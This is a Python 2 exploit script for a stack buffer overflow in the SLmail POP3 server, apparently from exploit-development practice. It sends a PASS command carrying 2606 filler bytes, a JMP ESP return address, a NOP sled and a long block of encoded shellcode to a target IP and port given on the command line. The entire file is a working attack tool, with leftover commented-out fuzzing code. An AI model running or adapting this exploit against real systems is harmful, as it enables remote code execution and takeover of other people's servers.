#!/usr/bin/python
import time, struct, sys
import socket as so

# Buff represents an array of buffers. This will be start at 100 and be incremented by 200 in order to attempt to crash SLmail.


buf =  ""
buf += "\xba\x82\xbf\xc8\x9e\xdb\xc2\xd9\x74\x24\xf4\x5f\x33"
buf += "\xc9\xb1\x52\x31\x57\x12\x83\xef\xfc\x03\xd5\xb1\x2a"
buf += "\x6b\x25\x25\x28\x94\xd5\xb6\x4d\x1c\x30\x87\x4d\x7a"
buf += "\x31\xb8\x7d\x08\x17\x35\xf5\x5c\x83\xce\x7b\x49\xa4"
buf += "\x67\x31\xaf\x8b\x78\x6a\x93\x8a\xfa\x71\xc0\x6c\xc2"
buf += "\xb9\x15\x6d\x03\xa7\xd4\x3f\xdc\xa3\x4b\xaf\x69\xf9"
buf += "\x57\x44\x21\xef\xdf\xb9\xf2\x0e\xf1\x6c\x88\x48\xd1"
buf += "\x8f\x5d\xe1\x58\x97\x82\xcc\x13\x2c\x70\xba\xa5\xe4"
buf += "\x48\x43\x09\xc9\x64\xb6\x53\x0e\x42\x29\x26\x66\xb0"
buf += "\xd4\x31\xbd\xca\x02\xb7\x25\x6c\xc0\x6f\x81\x8c\x05"
buf += "\xe9\x42\x82\xe2\x7d\x0c\x87\xf5\x52\x27\xb3\x7e\x55"
buf += "\xe7\x35\xc4\x72\x23\x1d\x9e\x1b\x72\xfb\x71\x23\x64"
buf += "\xa4\x2e\x81\xef\x49\x3a\xb8\xb2\x05\x8f\xf1\x4c\xd6"
buf += "\x87\x82\x3f\xe4\x08\x39\xd7\x44\xc0\xe7\x20\xaa\xfb"
buf += "\x50\xbe\x55\x04\xa1\x97\x91\x50\xf1\x8f\x30\xd9\x9a"
buf += "\x4f\xbc\x0c\x0c\x1f\x12\xff\xed\xcf\xd2\xaf\x85\x05"
buf += "\xdd\x90\xb6\x26\x37\xb9\x5d\xdd\xd0\xcc\xa1\xdd\xc2"
buf += "\xb9\xa3\xdd\x03\x81\x2d\x3b\x69\xe5\x7b\x94\x06\x9c"
buf += "\x21\x6e\xb6\x61\xfc\x0b\xf8\xea\xf3\xec\xb7\x1a\x79"
buf += "\xfe\x20\xeb\x34\x5c\xe6\xf4\xe2\xc8\x64\x66\x69\x08"
buf += "\xe2\x9b\x26\x5f\xa3\x6a\x3f\x35\x59\xd4\xe9\x2b\xa0"
buf += "\x80\xd2\xef\x7f\x71\xdc\xee\xf2\xcd\xfa\xe0\xca\xce"
buf += "\x46\x54\x83\x98\x10\x02\x65\x73\xd3\xfc\x3f\x28\xbd"
buf += "\x68\xb9\x02\x7e\xee\xc6\x4e\x08\x0e\x76\x27\x4d\x31"
buf += "\xb7\xaf\x59\x4a\xa5\x4f\xa5\x81\x6d\x7f\xec\x8b\xc4"
buf += "\xe8\xa9\x5e\x55\x75\x4a\xb5\x9a\x80\xc9\x3f\x63\x77"
buf += "\xd1\x4a\x66\x33\x55\xa7\x1a\x2c\x30\xc7\x89\x4d\x11"




#7767E871   FFE4             JMP ESP




buff=["A"*2606 + "\x71\xe8\xc4\x77" + "\x90"*20 + buf]

# Maximum size of buffer.

#max_buffer = 4000

# Initial counter value.

#counter = 100

# Value to increment per attempt.

#increment = 100


#while len(buff) <= max_buffer:
#    buff.append("A"*counter)
#    counter=counter+increment

for string in buff:
     try:
        server = str(sys.argv[1])
        port = int(sys.argv[2])
     except IndexError:
        print "[+] Usage example: python %s <ip> <port>" % sys.argv[0]
        sys.exit()   
     print "[+] Attempting to crash app at %s bytes" % len(string)
     s = so.socket(so.AF_INET, so.SOCK_STREAM)
     try:
        s.connect((server,port))
        s.recv(1024)
        s.send("USER username" + '\r\n')
        s.recv(1024)
        s.send("PASS " + string + '\r\n')
        s.close()
     except: 
        print "[+] Connection failed at %s bytes. Make sure IP/port are correct, or check debugger for app crash." % len(string)
        sys.exit()
